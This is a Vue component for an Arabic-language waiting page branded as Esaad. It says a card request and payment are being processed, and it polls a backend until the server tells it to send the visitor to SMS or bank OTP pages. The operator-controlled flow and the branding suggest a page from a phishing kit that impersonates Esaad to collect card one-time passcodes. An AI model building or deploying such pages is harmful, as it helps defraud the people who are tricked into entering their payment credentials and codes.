<script setup lang="ts">
import { onMounted, onUnmounted, ref } from 'vue';
import { useRouter } from 'vue-router';
import { getCardRequest } from '../api';

const router = useRouter();
const errorMessage = ref('');

let pollTimer: ReturnType<typeof setInterval> | null = null;

onMounted(() => {
  const checkStatus = async () => {
    try {
      const data = await getCardRequest();
      if (!data) {
        errorMessage.value = 'الطلب غير موجود.';
        return;
      }
      if (data.nextAction === 'otp-sms') {
        if (pollTimer) clearInterval(pollTimer);
        router.push('/otp');
      } else if (data.nextAction === 'otp-bank') {
        if (pollTimer) clearInterval(pollTimer);
        router.push('/otp-bank');
      }
    } catch (err) {
      console.error('Error polling request status:', err);
    }
  };

  checkStatus();
  pollTimer = setInterval(checkStatus, 1500);
});

onUnmounted(() => {
  if (pollTimer) {
    clearInterval(pollTimer);
  }
});
</script>

<template>
  <div dir="rtl" class="max-w-xl mx-auto bg-[#eef5f0] min-h-screen flex flex-col justify-between font-sans text-gray-900">
    
    <!-- Top Dark Esaad Header -->
    <header class="w-full bg-[#040c06] py-3 px-4 flex justify-center border-b border-[#009a44]/30">
      <div class="flex flex-col items-center select-none">
        <div class="text-[#39b54a] font-black text-base leading-none tracking-tight">إسعاد</div>
        <div class="text-[#39b54a] font-extrabold text-sm leading-none -mt-0.5 tracking-tight">esaad</div>
        <svg class="w-10 h-3 -mt-0.5" viewBox="0 0 60 18" fill="none">
          <circle cx="14" cy="4" r="2" fill="#39b54a" />
          <circle cx="46" cy="4" r="2" fill="#39b54a" />
          <path d="M 6 6 Q 30 18 54 6" stroke="#39b54a" stroke-width="3.2" stroke-linecap="round" fill="none" />
        </svg>
      </div>
    </header>

    <!-- Center Waiting Card -->
    <div class="px-5 my-auto">
      <div class="bg-white rounded-2xl p-6 shadow-[0_4px_25px_rgba(0,0,0,0.06)] border border-gray-200/80 flex flex-col items-center text-center max-w-sm mx-auto">
        <div class="relative flex items-center justify-center mb-5">
          <div class="animate-spin rounded-full h-14 w-14 border-4 border-[#e4f2ea] border-t-[#009a44]"></div>
          <span class="absolute text-[#008a40] font-black text-[10px]">esaad</span>
        </div>
        <h2 class="text-base font-extrabold text-gray-900 mb-1.5">يرجى الانتظار</h2>
        <p class="text-gray-600 text-xs leading-relaxed">
          جاري معالجة طلب بطاقة إسعاد وتأكيد عملية الدفع، الرجاء عدم إغلاق هذه الصفحة...
        </p>
        
        <div v-if="errorMessage" class="text-red-600 bg-red-50 px-3 py-1.5 rounded-lg text-xs font-bold mt-4">
          {{ errorMessage }}
        </div>
      </div>
    </div>

    <!-- Bottom Esaad Footer -->
    <footer class="bg-[#e4f2ea] px-5 py-4 text-center text-[11px] text-gray-600 border-t border-gray-200/60">
      © 2026 esaad, كل الحقوق محفوظة.
    </footer>

  </div>
</template>
